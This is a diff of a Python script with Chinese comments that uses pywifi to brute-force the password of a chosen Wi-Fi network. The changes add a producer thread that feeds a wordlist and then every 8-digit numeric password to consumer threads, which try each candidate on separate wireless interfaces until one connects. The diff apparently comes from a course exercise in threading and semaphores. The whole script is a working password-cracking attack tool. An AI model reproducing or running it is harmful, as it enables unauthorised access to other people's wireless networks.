@@ -7,14 +7,20 @@ from asyncio.tasks import sleep
 import itertools as its
 
 q = queue.Queue(maxsize=0)
-characters = list("0123")
+# characters = list("0123")
 ssid = ""  #wifi名
 testPwd = ""  #测试密码
 res = ""  #与OS课本知识不同，单单做定义，线程之间并不直接共享，而要在使用处显示声明
-sema = Semaphore(0)
-resSema = Semaphore(1)
+findSema = Semaphore(0)  # 控制诸多线程寻找密钥情况
+resSema = Semaphore(1)  # 同时只允许一个子线程汇报成功破解
+wifi = pywifi.PyWiFi()  # 抓取网卡接口
+thread_num = len(wifi.interfaces())  # 最优线程数为NCPU+1，故最优子线程数为NCPU
+pwdSema = Semaphore(thread_num * 2)  # 控制当前队列中有多少个带尝试的密钥
+wifi = pywifi.PyWiFi()
+for ifaces in wifi.interfaces():
+    ifaces.disconnect()  #断开所有连接
 
-
+# time.sleep(1)
 # def Iterator(num):
 #     iterator = its.product(characters, repeat=num)
 #     with open('D:\ 1.txt', 'w') as f:
@@ -25,21 +31,19 @@ resSema = Semaphore(1)
 
 
 def getWifiList():
-    wifi = pywifi.PyWiFi()  # 抓取网卡接口
+
     ifaces = wifi.interfaces()[0]  # 抓取第一个无限网卡
+    # print("**************************"+str(len(wifi.interfaces())))
     ifaces.disconnect()  # 测试链接断开所有链接
     time.sleep(1)
-    result = ifaces.scan_results()  #扫描所有wifi
-    for data in result:
-        print("SSID: " + data.ssid)
+    results = ifaces.scan_results()  #扫描所有wifi
+    for result in results:
+        print("SSID: " + result.ssid + " 信号强度: " + str(result.signal))
+
 
 
 def Connect(pwd):
-    wifi = pywifi.PyWiFi()
 
-    ifaces = wifi.interfaces()[0]  #获取第一个无线网卡
-    ifaces.disconnect()  #断开所有连接
-    time.sleep(1)
     profile = pywifi.Profile()  # 创建wifi链接文件
     profile.ssid = ssid  # wifi名称
     profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
@@ -60,11 +64,46 @@ def Connect(pwd):
     return isOK
 
 
-class myThread(Thread):
+class productor(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+        self.setDaemon(daemonic=True)  #子线程daemon属性为True，主线程运行结束时子线程将随主线程一起结束
+
+    def run(self):
+        pswd = ""
+
+        with open("pwd.txt", 'r') as f:
+            while (1):
+                pwd = f.readline()[:-1]
+                # print(pwd)
+                if (len(pwd) == 0):
+                    break
+                q.put(pwd)
+                # print("产生新密钥"+pwd)
+                pwdSema.acquire()
+        tryAllPassword(pswd, 8)
+
+
+def tryAllPassword(currentPwd, n):
+    if len(currentPwd) == n:
+        # print(currentPwd)
+        # f.write(currentPwd+"\n")
+        q.put(currentPwd)
+        # print("产生新密钥"+currentPwd)
+        pwdSema.acquire()
+        return
+    for c in list("1234567890"):
+        currentPwd += c
+        tryAllPassword(currentPwd, n)
+        currentPwd = currentPwd[:-1]
+
+
+class comsumer(Thread):
     def __init__(self, threadID, name):
         Thread.__init__(self)
         self.threadID = threadID
         self.name = name
+        self.ifaces = wifi.interfaces()[threadID]  #获取第一个无线网卡
         self.setDaemon(daemonic=True)  #子线程daemon属性为True，主线程运行结束时子线程将随主线程一起结束
 
     def run(self):
@@ -72,20 +111,20 @@ class myThread(Thread):
         while True:
             if not q.empty():
                 s = q.get()  #Queue自带锁，是线程安全的
-                print(s)
+                # print(s)
                 r = Connect(s)
+                print("完成尝试，释放密钥队列位")
+                pwdSema.release()  # 释放信号量以产生新的密钥
                 global res  #先声明为全局变量
                 res = s  #后使用
                 if (r):
                     #print("connection")
-                    sema.release()
+                    findSema.release()
                     return
             else:
                 print(self.name + "over!")
                 return
 
-
-thread_num = 10  #最优线程数为NCPU+1，故最优子线程数为NCPU
 
 if __name__ == '__main__':
     #for i in range(1000000):
@@ -98,13 +137,22 @@ if __name__ == '__main__':
     #     q.put(string)
 
     q.put(testPwd)
-    time_start = time.time()
-    for i in range(thread_num):
-        t = myThread(i + 1, "Thread-" + str(i + 1))
-        t.start()  #不能调用join阻塞主线程，因为主线程不必等待所有子线程完成
-        # time.sleep(2)
+    pwdSema.acquire()
+    # print("产生新密钥"+testPwd)
+    # 使用暴力破解——不可行
 
-    sema.acquire()  #信号量同步
+    proT = productor()
+    proT.start()
+
+    time_start = time.time()
+    # print(time_start)
+    for i in range(thread_num):
+        t = comsumer(i, "Thread-" + str(i + 1))
+        t.start()  #不能调用join阻塞主线程，因为主线程不必等待所有子线程完成
+        # time.sleep(3)
+
+    findSema.acquire()  #信号量同步
+
     time_end = time.time()
     print("Password Found! It is " + res + "\n")
     print('Totally Time Cost', time_end - time_start)
